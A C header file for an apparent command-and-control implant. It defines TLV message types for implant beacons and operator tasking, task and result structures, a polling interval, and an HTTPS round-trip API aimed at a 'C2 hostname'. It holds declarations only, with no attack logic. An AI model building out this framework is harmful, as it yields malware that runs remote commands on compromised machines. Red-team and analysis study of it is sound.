#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

/* WinSock2.h before Windows.h — mandatory ordering. */
#include <WinSock2.h>
#include <Windows.h>

#include "debug.h"
#include "error.h"
#include "tls.h"

/*
 * protocol.h - TLV message types, wire structures, and the HTTP-over-TLS
 * round-trip API used by the implant polling loop.
 *
 * The transport layer is HTTPS: each implant beacon is a single HTTP POST
 * request carrying a TLV-encoded message in the body; the server responds
 * with an HTTP 200 whose body is likewise a TLV message.  All traffic is
 * protected by TLS (see tls.h / tls.c).
 *
 * TLV wire format (little-endian):
 *   [4 bytes type][4 bytes payload_length][payload_length bytes payload]
 */

#define TLV_HEADER_SIZE  8U
#define MAX_MESSAGE_SIZE (4U * 1024U * 1024U)   /* 4 MB — supports large file transfers */

 /* ---- Message type identifiers ------------------------------------------- */

#define MSG_ERROR                0xFFFFFFFF

/* Implant → server */
#define MSG_AGENT_GET_TASK       0x10000001
#define MSG_AGENT_POST_RESULT    0x10000002

/* Operator → server */
#define MSG_OPERATOR_SUBMIT_TASK 0x10000003
#define MSG_OPERATOR_GET_RESULT  0x10000004

/* Server → implant / operator */
#define MSG_SERVER_NO_TASK       0x10000005
#define MSG_SERVER_TASK          0x10000006
#define MSG_SERVER_ACK           0x10000007
#define MSG_SERVER_RESULT        0x10000008
#define MSG_SERVER_PENDING       0x10000009

#define DEFAULT_AGENT_ID         1U
#define DEFAULT_POLL_INTERVAL_MS 5000U

/* ---- Wire structures ----------------------------------------------------- */

typedef struct _TLV_MESSAGE
{
    DWORD  type;
    DWORD  length;
    PBYTE  value;   /* heap-allocated; free with FreeTlvMessage */
} TLV_MESSAGE;

typedef struct _AGENT_GET_TASK_REQUEST
{
    DWORD agentId;
} AGENT_GET_TASK_REQUEST;

typedef struct _TASK_HEADER
{
    DWORD taskId;
    DWORD commandId;
    DWORD argLength;
} TASK_HEADER;

typedef struct _TASK_RESULT_HEADER
{
    DWORD agentId;
    DWORD taskId;
    DWORD commandId;
    DWORD status;
    DWORD resultLength;
} TASK_RESULT_HEADER;

/* ---- API ----------------------------------------------------------------- */

/**
 * @brief Sends a TLV request over HTTPS and receives the TLV response.
 *
 * Wraps the outbound TLV message in an HTTP POST body (Content-Type:
 * application/octet-stream) and parses the inbound HTTP 200 response body as
 * a TLV message.  The caller is responsible for calling FreeTlvMessage on
 * @p response when it is no longer needed.
 *
 * @param ctx        An active TLS context (connected + handshake complete).
 * @param host       Wide-character C2 hostname, used in the HTTP Host header.
 * @param msgType    TLV message type for the outbound message.
 * @param payloadLen Number of bytes in @p payload (may be 0).
 * @param payload    Outbound TLV payload (may be NULL when payloadLen is 0).
 * @param response   Receives the decoded inbound TLV message on success.
 *
 * @return TRUE on success, FALSE if any send, receive, or parse step fails.
 */
BOOL HttpSendTlvRoundTrip(
    TLS_CONTEXT* ctx,
    PCWSTR        host,
    DWORD         msgType,
    DWORD         payloadLen,
    CONST PBYTE   payload,
    TLV_MESSAGE* response);

/**
 * @brief Frees the heap-allocated payload inside a TLV message.
 *
 * @param msg The TLV message whose payload should be released.
 */
VOID FreeTlvMessage(TLV_MESSAGE* msg);